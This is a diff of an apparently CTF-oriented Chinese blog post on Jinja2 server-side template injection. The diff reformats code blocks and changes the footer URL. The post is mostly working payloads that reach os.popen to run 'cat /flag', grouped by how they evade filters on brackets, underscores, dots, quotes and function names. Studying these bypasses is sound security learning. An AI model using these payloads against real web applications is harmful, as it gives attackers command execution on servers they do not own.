@@ -77,40 +77,44 @@ file、subprocess.Popen、os.popen、exec、eval
 
   魔术方法\_\_getitem\_\_可替代中括号
 
-  ```
-  当中括号被过滤时，如下将被限制访问:
+  ```python
+  # 当中括号被过滤时，如下将被限制访问:
   {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}}
 
-  可用__getitem__替换中括号[]:
+  # 可用__getitem__替换中括号[]:
   {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}}
   ```
 
 - ## 过滤下划线
 
-  ```
-  原 payload 被限制:
+  ```python
+  # 原 payload 被限制:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
-
-  1.使用 attr()绕过，payload:
+  
+  # 1.使用 attr()绕过，payload:
   {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }}
   同时 get 方法传参?a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__
-
-  2.将下划线进行编码绕过，payload:
+  
+  # 2.将下划线进行编码绕过，payload:
   {{ ().['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[xx]['\x5f\x5finit\x5f\x5f'].['\x5f\x5fglobals\x5f\x5f']['popen']('cat /flag') }}
   ```
 
+  
+
 - ## 过滤点
 
-  ```
-  原 payload 被限制:
+  ```python
+  # 原 payload 被限制:
   {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
-
-  1.使用 attr()绕过，payload:
+  
+  # 1.使用 attr()绕过，payload:
   {{ () | attr('__class__') | attr('__base__') | attr('__subclasses__')() | attr('__getitem__')(xx) | attr('__init__') | attr('__globals__') | attr('__getitem__')('popen')('cat /flag') | attr('read')()}}
-
-  2. 使用中括号绕过，payload:
-     {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
+  
+  # 2. 使用中括号绕过，payload:
+  {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
   ```
+
+  
 
 - ## 过滤大括号
 
@@ -120,20 +124,22 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤引号
 
-  ```
-  当'被过滤后以下访问将被限制
+  ```python
+  # 当'被过滤后以下访问将被限制
   {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
-
-  1.通过 request.args 的 get 传参输入引号内的内容，payload：
+  
+  # 1.通过request.args的get传参输入引号内的内容，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[request.args.popen](request.args.cmd).read() }}
-  同时 get 传参?popen=popen&cmd=cat /flag
-
-  2.通过 request.form 的 post 传参输入引号内的内容，payload：
+  同时get传参?popen=popen&cmd=cat /flag
+  
+  # 2.通过request.form的post传参输入引号内的内容，payload：
   {{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read() }}
-  同时 post 传参?popen=popen&cmd=cat /flag
-
-  3.使用 cookies 传参，如 request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag
+  同时post传参?popen=popen&cmd=cat /flag
+  
+  # 3.使用cookies传参，如request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag
   ```
+
+  
 
 - ## 过滤数字
 
@@ -144,20 +150,22 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤函数名
 
-  ```
-  1.使用拼接绕过，payload:
+  ```python
+  # 1.使用拼接绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }}
   
-  2.16进制编码绕过，payload:
+  # 2.使用16进制编码绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\x70\x6f\x70\x65\x6e']('cat /flag').read() }}
   
-  3.base64编码绕过，payload:
+  # 3.使用base64编码绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }}
   ```
+  
+  
 
 
 ---
 
 > 作者: Hinoatari  
-> URL: https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  
+> URL: http://localhost:1313/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  
 
